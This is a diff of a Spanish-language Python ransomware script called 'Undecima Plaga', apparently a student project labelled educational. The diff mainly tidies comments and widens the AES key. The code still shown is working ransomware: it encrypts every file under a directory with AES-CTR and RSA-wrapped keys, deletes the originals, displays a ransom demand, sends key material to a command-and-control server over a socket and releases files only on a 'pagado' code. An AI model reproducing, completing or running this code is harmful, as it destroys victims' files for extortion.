@@ -1,18 +1,4 @@
 #!/usr/bin/env python3
-"""
-=========================================================
-  UNDECIMA PLAGA — Ransomware
-=========================================================
-  PROPOSITO EDUCATIVO - ENTORNO CONTROLADO
-
-  Modos de uso:
-    # Cifrar archivos (ataque):
-    python3 ransomware_final.py --ataque -d /ruta/victima
-
-    # Recuperar archivos (tras el pago):
-    python3 ransomware_final.py --recuperacion -d /ruta/victima --ip 127.0.0.1 -p 9999
-=========================================================
-"""
 
 import os
 import sys
@@ -40,29 +26,16 @@ QwIDAQAB
 TAM_SEGMENTO_RSA = 190
 CHUNK_SIZE       = 1024
 
-
-# ═════════════════════════════════════════════
 #  FUNCIONES DE LLAVES
-# ═════════════════════════════════════════════
-
 def generar_publica_local():
     """
     Genera el par de llaves RSA locales y retorna SOLO la llave publica.
     La llave privada nunca se asigna a una variable que persista:
-    se serializa en el momento y se descarta automaticamente al salir
-    del scope de la funcion.
+    se serializa en el momento y se descarta automaticamente al salir de la funcion.
 
-    Antes (con del):
-      privada_local = generar_privada()    # queda en memoria
-      privada_pem   = serializar(privada)  # queda en memoria
-      ...
-      del privada_local                    # borrado manual
-      del privada_pem                      # borrado manual
-
-    Ahora (sin del):
-      La llave privada se serializa dentro de la funcion y Python
-      la descarta automaticamente al terminar. Solo sale la llave
-      publica y los segmentos cifrados, nunca la privada en claro.
+    La llave privada se serializa dentro de la funcion y Python
+    la descarta automaticamente al terminar. Solo sale la llave
+    publica y los segmentos cifrados, nunca la privada en claro.
     """
     privada_local = rsa.generate_private_key(
         public_exponent=65537,
@@ -70,18 +43,17 @@ def generar_publica_local():
         backend=default_backend()
     )
 
-    # Serializar y segmentar la llave privada dentro del mismo scope
-    # para que no salga de esta funcion en ningun momento
+    # Serializar y segmentar la llave privada dentro del mismo scope para que no salga de esta funcion en ningun momento
     privada_pem = privada_local.private_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PrivateFormat.TraditionalOpenSSL,
         encryption_algorithm=serialization.NoEncryption()
     )
+
     segmentos_planos  = segmentar_llave(privada_pem)
     segmentos_cifrados = cifrar_segmentos(segmentos_planos)
 
-    # Solo retornamos la publica y los segmentos cifrados
-    # La privada en claro queda fuera de alcance al terminar la funcion
+    # Solo retornamos la publica y los segmentos cifrados, mientras, privada en claro queda fuera de alcance al terminar la funcion
     return privada_local.public_key(), segmentos_cifrados
 
 def convertir_bytes_llave_privada(contenido_binario):
@@ -92,10 +64,7 @@ def convertir_bytes_llave_privada(contenido_binario):
     )
 
 
-# ═════════════════════════════════════════════
-#  PROTOCOLO DE SOCKET (del compañero - no tocar)
-# ═════════════════════════════════════════════
-
+#  PROTOCOLO DE SOCKET (Griss)
 def _recibir_exacto(sock, n):
     datos = b''
     while len(datos) < n:
@@ -114,21 +83,15 @@ def recibir_bytes(sock) -> bytes:
     return _recibir_exacto(sock, longitud)
 
 
-# ═════════════════════════════════════════════
-#  SEGMENTACION Y EMPAQUETADO (del compañero - no tocar)
-# ═════════════════════════════════════════════
-
+#  SEGMENTACION Y EMPAQUETADO (Griss)
 def segmentar_llave(llave_privada_local):
-    """Divide los bytes de la llave privada local en bloques de 190 bytes."""
+    #Divide los bytes de la llave privada local en bloques de 190 bytes.
     segmentos = [llave_privada_local[i:i + TAM_SEGMENTO_RSA]
                  for i in range(0, len(llave_privada_local), TAM_SEGMENTO_RSA)]
     return segmentos
 
 def cifrar_segmentos(segmentos_llave):
-    """
-    Cifra cada segmento de la llave_privada_local con RSA-OAEP
-    usando la llave_publica_permanente.
-    """
+    # Cifra cada segmento de la llave_privada_local con RSA-OAEP usando la llave_publica_permanente.
     llave_publica_permanente = serialization.load_pem_public_key(
         LLAVE_PUBLICA_PERMANENTE,
         backend=default_backend()
@@ -168,11 +131,7 @@ def enviar_paquete_zip(sock, nombre_zip="llave_local_protegida.zip"):
     print(f"[+] Paquete {nombre_zip} enviado con exito al servidor CC.")
 
 
-# ═════════════════════════════════════════════
-#  CIFRADO DE ARCHIVOS AES-CTR (recursivo con glob)
-#  Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]
-# ═════════════════════════════════════════════
-
+#  CIFRADO DE ARCHIVOS AES-CTR (Abraham)
 def cifrar_archivos(directorio, llave_publica_local):
     """
     Cifra todos los archivos del directorio de forma recursiva con AES-CTR.
@@ -183,20 +142,18 @@ def cifrar_archivos(directorio, llave_publica_local):
       3. Escribe en cabecera: [IV 16B] + [LLAVE_AES_CIFRADA 256B]
       4. Cifra el contenido con AES-CTR en bloques de CHUNK_SIZE
       5. Elimina el archivo original y renombra con extension .cifrado
+
+      Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]
     """
     archivos = []
-    for ruta in glob.glob(os.path.join(directorio, '**'), recursive=True):
-        if os.path.isfile(ruta):
+    for ruta in glob.glob(os.path.join(directorio, '**'), recursive=True): #usa ** y recursive para profundizar en subcarpetas
+        if os.path.isfile(ruta): #solo selecciona archivos
             archivos.append(ruta)
-
-    if not archivos:
-        print(f"[!] No se encontraron archivos en: {directorio}")
-        sys.exit(1)
 
     print(f"[+] Cifrando {len(archivos)} archivo(s)...")
     for ruta in archivos:
-        llave_aes = os.urandom(16)
-        iv        = os.urandom(16)
+        llave_aes = os.urandom(32)
+        iv = os.urandom(16)
 
         llave_aes_cifrada = llave_publica_local.encrypt(
             llave_aes,
@@ -211,26 +168,25 @@ def cifrar_archivos(directorio, llave_publica_local):
         encryptor = cipher.encryptor()
 
         ruta_cifrada = ruta + ".cifrado"
-        with open(ruta, 'rb') as f_entrada, open(ruta_cifrada, 'wb') as f_salida:
-            f_salida.write(iv)
-            f_salida.write(llave_aes_cifrada)
-            while True:
-                chunk = f_entrada.read(CHUNK_SIZE)
-                if not chunk:
-                    break
-                f_salida.write(encryptor.update(chunk))
-            f_salida.write(encryptor.finalize())
+        with open(ruta, 'rb') as f_entrada:
+            with open(ruta_cifrada, 'wb') as f_salida:
+                # Cabecera: IV + LLAVE_AES_CIFRADA
+                f_salida.write(iv)
+                f_salida.write(llave_aes_cifrada)
+                # Contenido cifrado en bloques
+                while True:
+                    chunk = f_entrada.read(CHUNK_SIZE)
+                    if not chunk:
+                        break
+                    f_salida.write(encryptor.update(chunk))
+                f_salida.write(encryptor.finalize())
 
         os.remove(ruta)
         print(f"[+] Cifrado: {os.path.basename(ruta_cifrada)}")
     print(f"[+] {len(archivos)} archivo(s) cifrados.")
 
 
-# ═════════════════════════════════════════════
-#  DESCIFRADO DE ARCHIVOS AES-CTR (recursivo con glob)
-#  Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]
-# ═════════════════════════════════════════════
-
+#  DESCIFRADO DE ARCHIVOS AES-CTR (Abraham)
 def descifrar_archivos(directorio, llave_privada_local):
     """
     Descifra todos los archivos .cifrado del directorio de forma recursiva.
@@ -240,63 +196,60 @@ def descifrar_archivos(directorio, llave_privada_local):
       2. Descifra la llave AES con RSA-OAEP (llave privada local)
       3. Descifra el contenido con AES-CTR en bloques de CHUNK_SIZE
       4. Restaura el archivo original y elimina el .cifrado
+
+      Estructura: [IV 16B] + [LLAVE_AES_CIFRADA 256B] + [CONTENIDO_CIFRADO]
     """
     archivos = []
-    for ruta in glob.glob(os.path.join(directorio, '**', '*.cifrado'), recursive=True):
-        if os.path.isfile(ruta):
+    for ruta in glob.glob(os.path.join(directorio, '**', '*.cifrado'), recursive=True): #usa ** y recursive para profundizar en subcarpetas, agrega *.cifrado para buscar archivos con la extension
+        if os.path.isfile(ruta): #toma solo archivos
             archivos.append(ruta)
-
-    if not archivos:
-        print(f"[!] No se encontraron archivos .cifrado en: {directorio}")
-        return
 
     print(f"[+] Descifrando {len(archivos)} archivo(s)...")
     for ruta in archivos:
         ruta_original = ruta.removesuffix(".cifrado")
 
-        with open(ruta, 'rb') as f_entrada, open(ruta_original, 'wb') as f_salida:
-            iv                = f_entrada.read(16)
-            llave_aes_cifrada = f_entrada.read(256)
+        with open(ruta, 'rb') as f_entrada:
+            with open(ruta_original, 'wb') as f_salida:
+                # Leer cabecera: IV (16B) + LLAVE_AES_CIFRADA (256B)
+                iv = f_entrada.read(16)
+                llave_aes_cifrada = f_entrada.read(256)
 
-            llave_aes = llave_privada_local.decrypt(
-                llave_aes_cifrada,
-                padding.OAEP(
-                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                    algorithm=hashes.SHA256(),
-                    label=None
+                # Descifrar llave AES con llave privada local (RSA-OAEP)
+                llave_aes = llave_privada_local.decrypt(
+                    llave_aes_cifrada,
+                    padding.OAEP(
+                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                        algorithm=hashes.SHA256(),
+                        label=None
+                    )
                 )
-            )
 
-            cipher    = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend=default_backend())
-            decryptor = cipher.decryptor()
+                # Descifrar contenido en bloques
+                cipher    = Cipher(algorithms.AES(llave_aes), modes.CTR(iv), backend=default_backend())
+                decryptor = cipher.decryptor()
 
-            while True:
-                chunk = f_entrada.read(CHUNK_SIZE)
-                if not chunk:
-                    break
-                f_salida.write(decryptor.update(chunk))
-            f_salida.write(decryptor.finalize())
+                while True:
+                    chunk = f_entrada.read(CHUNK_SIZE)
+                    if not chunk:
+                        break
+                    f_salida.write(decryptor.update(chunk))
+                f_salida.write(decryptor.finalize())
 
         os.remove(ruta)
         print(f"[+] Descifrado: {os.path.basename(ruta_original)}")
     print(f"[+] {len(archivos)} archivo(s) restaurados.")
 
-
-# ═════════════════════════════════════════════
 #  ATAQUE
-# ═════════════════════════════════════════════
-
 def ataque(directorio):
     """
     FASES:
     1. Genera llaves RSA locales — la privada nunca sale de generar_publica_local()
     2. Empaqueta los segmentos cifrados en un ZIP
-    3. Cifra los archivos del directorio con AES-CTR (recursivo)
+    3. Cifra los archivos del directorio con AES-CTR
     """
     print("======================== INICIANDO FASE DE ATAQUE ========================")
 
-    # La llave privada se genera, serializa, segmenta y cifra dentro de
-    # generar_publica_local(). Solo salen la publica y los segmentos cifrados.
+    # La llave privada se genera, serializa, segmenta y cifra dentro de generar_publica_local(). Solo salen la publica y los segmentos cifrados.
     publica_local, segmentos_cifrados = generar_publica_local()
     print("[+] Llaves RSA locales generadas. Llave privada protegida.")
 
@@ -312,16 +265,8 @@ def ataque(directorio):
     print("  [!] TODOS TUS ARCHIVOS HAN SIDO CIFRADOS")
     print("  [!] Para recuperarlos debes realizar un pago por rescate.")
     print("="*60)
-    print("  Una vez realizado el pago ejecuta:")
-    print("  python3 ransomware_final.py --recuperacion -d <dir>")
-    print("                              --ip <ip_servidor> -p <puerto>")
-    print("="*60 + "\n")
 
-
-# ═════════════════════════════════════════════
 #  RECUPERACION
-# ═════════════════════════════════════════════
-
 def recuperacion(directorio, ip_servidor, puerto_servidor):
     """
     FASES:
@@ -333,7 +278,7 @@ def recuperacion(directorio, ip_servidor, puerto_servidor):
     print("======================== INICIANDO FASE DE RECUPERACION ========================")
 
     confirmacion = input("Ingrese el codigo de liberacion: ")
-    if confirmacion.lower() != "pagado":
+    if confirmacion != "pagado":
         print("[!] Pago no verificado. Saliendo...")
         return
 
@@ -372,20 +317,15 @@ def recuperacion(directorio, ip_servidor, puerto_servidor):
     except Exception as e:
         print(f"[!] Error durante la recuperacion: {e}")
 
-
-# ═════════════════════════════════════════════
-#  PUNTO DE ENTRADA
-# ═════════════════════════════════════════════
-
 if __name__ == "__main__":
     all_args = argparse.ArgumentParser(description="Undecima Plaga — Ransomware (educativo)")
     modo = all_args.add_mutually_exclusive_group(required=True)
-    modo.add_argument("--ataque",       action="store_true", help="Cifra los archivos del directorio")
+    modo.add_argument("--ataque", action="store_true", help="Cifra los archivos del directorio")
     modo.add_argument("--recuperacion", action="store_true", help="Descifra los archivos tras el pago")
 
     all_args.add_argument("-d", "--directorio", required=True, help="Directorio donde se realizara el ataque/recuperacion")
-    all_args.add_argument("--ip",               help="IP del servidor CC")
-    all_args.add_argument("-p", "--puerto",     type=int, help="Puerto del servidor CC")
+    all_args.add_argument("--ip", help="IP del servidor CC")
+    all_args.add_argument("-p", "--puerto", type=int, help="Puerto del servidor CC")
 
     args = all_args.parse_args()
 
